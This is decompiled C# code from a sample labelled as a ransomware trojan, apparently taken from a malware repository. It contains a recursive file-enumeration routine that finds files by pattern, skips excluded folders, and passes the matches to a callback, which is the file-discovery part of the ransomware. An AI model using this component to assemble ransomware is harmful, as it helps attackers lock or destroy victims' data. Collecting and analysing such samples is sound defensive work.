// Decompiled with JetBrains decompiler
// Type: ns1.Class39
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: E391E61C-54CD-42F7-87F5-F1422ADC71CE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-59e442191cd686b83bd02e24c30b2cd3b7c14c64e8dea6ba77330d9bb8c0d75c.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace ns1
{
  internal static class Class39
  {
    public static void smethod_0(
      string startPath,
      string filePattern,
      bool subdirectories,
      Action<List<string>> actionForFiles,
      List<string> excludedBaseFolders = null,
      bool async = false)
    {
      if (excludedBaseFolders != null && Class39.smethod_1((IList<string>) excludedBaseFolders, startPath))
        return;
      string[] strArray1 = new string[0];
      if (subdirectories)
      {
        try
        {
          strArray1 = Directory.GetDirectories(startPath, "*", SearchOption.TopDirectoryOnly);
        }
        catch
        {
        }
      }
      string[] strArray2 = filePattern.Split(new char[1]
      {
        ';'
      }, StringSplitOptions.RemoveEmptyEntries);
      List<string> stringList = new List<string>();
      foreach (string searchPattern in strArray2)
      {
        try
        {
          string[] files = Directory.GetFiles(startPath, searchPattern, SearchOption.TopDirectoryOnly);
          if (files.Length > 0)
            stringList.AddRange((IEnumerable<string>) files);
        }
        catch
        {
        }
      }
      if (stringList.Count > 0 && actionForFiles != null)
      {
        if (async)
          actionForFiles.BeginInvoke(stringList, (AsyncCallback) null, (object) null);
        else
          actionForFiles(stringList);
        string[] strArray3 = new string[0];
      }
      if (strArray1 == null || strArray1.Length <= 0)
        return;
      foreach (string str in strArray1)
      {
        if (excludedBaseFolders == null || !Class39.smethod_1((IList<string>) excludedBaseFolders, str))
          Class39.smethod_0(str, filePattern, subdirectories, actionForFiles, excludedBaseFolders, async);
      }
    }

    private static bool smethod_1(IList<string> ilist_0, string string_0)
    {
      string_0 = string_0.ToLower();
      for (int index = 0; index < ilist_0.Count; ++index)
      {
        string lower = ilist_0[index].ToLower();
        if (string_0.StartsWith(lower))
          return true;
      }
      return false;
    }
  }
}
